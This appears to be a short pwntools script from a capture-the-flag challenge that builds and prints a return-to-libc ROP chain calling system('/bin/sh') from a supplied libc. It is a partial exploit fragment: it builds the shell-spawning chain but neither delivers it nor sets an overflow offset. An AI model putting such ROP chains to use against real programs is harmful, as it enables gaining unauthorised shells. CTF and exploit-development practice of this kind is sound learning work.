from pwn import *


def main():
    elf = ELF("./challenge")
    context.binary = elf
    libc = ELF("./libc.so.6")

    rop = ROP([libc])
    rop.call("system", [next(libc.search(b"/bin/sh"))])
    print(rop.dump())


if __name__ == "__main__":
    main()
